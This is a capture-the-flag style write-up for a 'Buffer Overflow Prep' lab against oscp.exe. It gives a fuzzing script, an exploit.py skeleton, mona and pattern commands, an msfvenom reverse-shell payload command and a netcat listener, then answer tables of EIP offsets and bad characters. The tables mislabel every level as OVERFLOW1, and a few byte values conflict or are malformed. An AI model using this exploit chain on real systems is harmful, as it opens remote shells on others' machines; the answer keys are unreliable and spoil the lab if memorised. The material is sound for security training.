# Buffer Overflow Prep
## 24-06-2022
## level : easy



## oscp.exe - OVERFLOW1

Finding the fuzzing bytes
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.39.107"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  
```

Create a mona working directory in immunity debugger
```
!mona config -set workingfolder c:\mona\%p
```

Create the Cyclic pattern of a length about 400 bytes longer than the actual bytes
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```

Copy the above output and put it into the `payload` of the following code (exploit.py)
```
import socket

ip = "10.10.39.107"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""

#        ||     
#    PUT || HERE 
#        \/
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
```
The above program should crash the program. note the `EIP` value from the crashed window.
To find the offset we can use two method :

Method 1 : just run the command from the command bar of immunity debugger. (replace the distance value with the length value)
```
!mona findmsp -distance 2500
```
Method 2: run the following command in kali terminal with the `EIP` address value after the `-q` switch
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 35714234

```

### Finding the bad characters

creating the badchars in immunity debugger

```
!mona bytearray -b "\x00"
```

Generate the bad characters 
```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()

```

Copy the badchars generated above and put into the `payload` variable of the above `exploit.py` program and also update the `offset` with the offset found above

Now after starting the server and debugger just run the `exploit.py` from the local kali machine.


After the program crashed run the following mona command with the `ESP` address value at the end


```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>

```

The popup window will show all the badchars. take only first of the sequence.


Generating the payload ( put all the badchars after `-b` )

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.48.110 LPORT=4444 EXITFUNC=thread -f c  -b "\x00\x07\x2e\xa0"
```


Copy the array value and update it to the `payload` variable of `exploit.py` program ( use `()` and paste inside it )


Finding the jump point ( put all the badchars after `-cpb` )

```
!mona jmp -r esp -cpb "\x00"
```

Take any of the address found by the above command and put it backward like `AABBCCDD` => `\xDD\xCC\xBB\xAA` into the `retn` variable of the above `exploit.py` program.


### Prepend NOP's 

Update the `padding` variable in `exploit.py` program with `"\x90" * 16` the line should look like 

```
padding = "\x90" * 16

```

### Getting a shell


Now run a netcat listener with the port defined at the time of generating payload on your local machine

```
nc -lvnp 4444

```

Run the server on target


Run the `exploit.py` from local kali machine





| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1978 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x07\x2E\xA1 |



## oscp.exe - OVERFLOW2


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 634 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x23\x3c\x83\xba |



## oscp.exe - OVERFLOW3


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1274 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x11\x40\x5f\xb8\xee |




## oscp.exe - OVERFLOW4


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 2026 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\xa9\xcd\xd4 |




## oscp.exe - OVERFLOW5


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 314 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x16\x2f\xf4\xfd |




## oscp.exe - OVERFLOW6


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1034 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x08\x2c\xad |




## oscp.exe - OVERFLOW7


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1306 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x8c\xae\xbe\xfb |




## oscp.exe - OVERFLOW8


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1786 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x1d\x2e\xc7\xee |




## oscp.exe - OVERFLOW9


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 1514 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\x04\x3e\x3f\xe1 |




## oscp.exe - OVERFLOW10


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the EIP offset for OVERFLOW1 ? | 537 |
| What are the badchars for OVERFLOW1 ? (in byte order) | \x00\xa0\xad\xbe\xde\ef |











--------------------------    THE END    -------------------------- 
